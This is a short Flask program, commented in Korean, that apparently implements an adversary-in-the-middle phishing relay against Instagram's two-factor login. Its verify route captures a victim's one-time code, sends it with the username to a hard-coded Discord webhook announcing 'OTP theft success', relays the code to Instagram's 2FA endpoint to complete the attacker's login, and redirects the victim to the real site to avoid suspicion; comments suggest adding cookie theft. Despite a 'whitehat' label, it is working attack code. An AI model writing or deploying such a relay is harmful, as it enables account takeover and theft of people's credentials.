from flask import Flask, render_template, request, redirect, session
import requests
import json
import time

app = Flask(__name__)
app.secret_key = "whitehat_research_key"

# 제공해주신 디스코드 웹훅 주소
WEBHOOK_URL = "https://discord.com/api/webhooks/1466648989309997117/2Ah53vvh-hW2S1bZEdLF1i5Qs0YEa1Fmd1_ZXUHjDFk1wRLCLQAADGLpR2HipxuoXWEC"

# 실제 인스타그램과 통신할 세션
insta_session = requests.Session()

@app.route('/verify', methods=['POST'])
def verify():
    otp_code = request.form.get('otp_code')
    username = session.get('username', 'Unknown User')
    
    # 1. 디스코드 웹훅으로 OTP 전송
    webhook_data = {
        "content": f"🚨 **[실시간 중계] OTP 탈취 성공!**\n👤 유저: `{username}`\n🔢 OTP 코드: `{otp_code}`\n⏰ 시간: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

    # 2. 실제 인스타그램 서버에 OTP 릴레이 (AitM 핵심 로직)
    # 실제 구현 시에는 인스타의 2FA 엔드포인트와 헤더를 정확히 맞춰야 합니다.
    insta_login_url = "https://www.instagram.com/accounts/login/ajax/two_factor/"
    payload = {
        'verificationCode': otp_code,
        'username': username,
        'queryParams': "{}"
    }
    
    # 중계 시도 (실제 인스타 서버로부터 응답을 받음)
    response = insta_session.post(insta_login_url, data=payload)

    # 3. 실제 로그인이 승인되었는지 확인 후 리다이렉트
    # 로그인이 성공하든 실패하든, 사용자를 실제 인스타로 돌려보내 의심을 피합니다.
    if response.status_code == 200:
        # 성공 시 쿠키를 탈취하는 코드가 추가될 수 있습니다.
        return redirect("https://www.instagram.com/")
    else:
        # 실패 시 에러가 난 척하며 실제 로그인 페이지로 리턴
        return redirect("https://www.instagram.com/accounts/login/")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)